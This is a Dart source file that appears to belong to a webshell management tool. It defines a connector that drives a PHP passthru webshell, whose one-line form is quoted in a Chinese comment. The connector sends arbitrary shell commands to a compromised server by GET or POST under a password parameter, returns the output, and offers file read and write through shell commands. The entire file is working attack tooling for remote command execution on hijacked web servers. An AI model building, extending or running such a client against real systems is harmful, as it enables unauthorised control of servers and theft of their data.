import 'dart:async';

import 'package:http/http.dart' as http;

import 'shell_connector.dart';
import 'shell_exec_connector.dart';
import '../utils/encoding_utils.dart';

/// `php_passthru_req.php`：`passthru($_REQUEST[password])`
///
/// 直接命令执行型，无代码注入能力。
/// 文件操作通过 shell 命令（cat/base64/echo）模拟。
class PhpPassthruConnector extends ShellExecConnector {
  PhpPassthruConnector(super.webshell);

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  String get _param =>
      webshell.password?.isNotEmpty == true ? webshell.password! : 'cmd';

  @override
  Future<String> sendRawCommand(String cmd) async {
    try {
      final uri = Uri.parse(webshell.url);
      http.Response response;

      if (webshell.method == 'GET') {
        final params = Map<String, String>.from(uri.queryParameters);
        params[_param] = cmd;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 20));
      } else {
        response = await http
            .post(
              uri,
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: {_param: cmd},
            )
            .timeout(const Duration(seconds: 20));
      }

      if (response.statusCode != 200) return '[HTTP ${response.statusCode}]';
      return _stripPre(decodeWithFallback(response.bodyBytes));
    } on TimeoutException {
      return '[Timeout]';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  /// 去除 passthru 输出的 `<pre>...</pre>` 包装
  static String _stripPre(String raw) {
    var s = raw.trim();
    if (s.startsWith('<pre>')) s = s.substring(5);
    if (s.endsWith('</pre>')) s = s.substring(0, s.length - 6);
    return s.trim();
  }
}
